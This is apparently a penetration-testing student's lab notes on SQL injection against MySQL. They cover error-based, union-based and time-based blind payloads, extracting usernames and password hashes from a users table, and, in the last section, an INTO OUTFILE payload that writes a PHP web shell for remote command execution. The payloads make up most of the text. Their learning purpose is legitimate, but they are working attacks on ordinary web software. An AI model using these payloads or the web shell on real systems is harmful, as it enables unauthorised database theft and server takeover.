Always use `#` or `//` if `--` won't work as these are other commenting operator

Use this [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) for any SQLi payload or finding version etc.
# Error-based

to identify run command with `'`  so if it gives error then confirm it's SQLi

**Most basic payload**
```
offsec' OR 1=1 -- //
```

### First verify version
```
' or 1=1 in (select @@version) -- //
```

> [!NOTE]
> MySQL accepts both _version()_ and _@@version_ statements.

![[Pasted image 20240507123148.png]]

### try to retrieve info with error-based
```
' OR 1=1 in (SELECT * FROM users) -- //
```

![[Pasted image 20240507123335.png]]

This means that we should only query one column at a time

we can use this method here from [[Labs]] Retrieving multiple values within a single column

### Offsec way to get info
```
' or 1=1 in (SELECT password FROM users) -- //
```

![[Pasted image 20240507123759.png]]

```
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

![[Pasted image 20240507123826.png]]

# Union-based

when we have visual representation of our payload

### 2 rules
1. know columns
2. know datatypes supported by each column

we can determine columns with `ORDER BY` clause
```
' ORDER BY 1-- //
```

Do it until we get error. suppose if we get error at 6 then server have 5 columns

### First enum

```
%' UNION SELECT database(), user(), @@version, null, null -- //
```

Since we want to retrieve all the data from the _customers_ table, we'll use the percentage sign followed by a single quote to close the search parameter

![[Pasted image 20240507124757.png]]

database is not shown, which means 1st column is not supports string datatypes

```
' UNION SELECT null, null, database(), user(), @@version  -- //
```

![[Pasted image 20240507125003.png]]

### Second enum

We'll attempt to retrieve the _columns_ table from the _information_schema_ database belonging to the current database. We'll then store the output in the second, third, and fourth columns, leaving the first and fifth columns null.

```
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

![[Pasted image 20240507125140.png]]

we get to know about other field named password

```
' UNION SELECT null, username, password, description, null FROM users -- //
```

![[Pasted image 20240507125234.png]]

Got MD5
# Blind SQLi

```
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
```

```
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```


# Get RCE from MySQL with UNION based

### Upload webshell
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

**But first we need to determine number of columns by order by/null values and know data types**

```
IP/tmp/webshell.php?cmd=id
```

![[Pasted image 20240507174251.png]]

then we can use different reverse shells from revshells.com and get shell


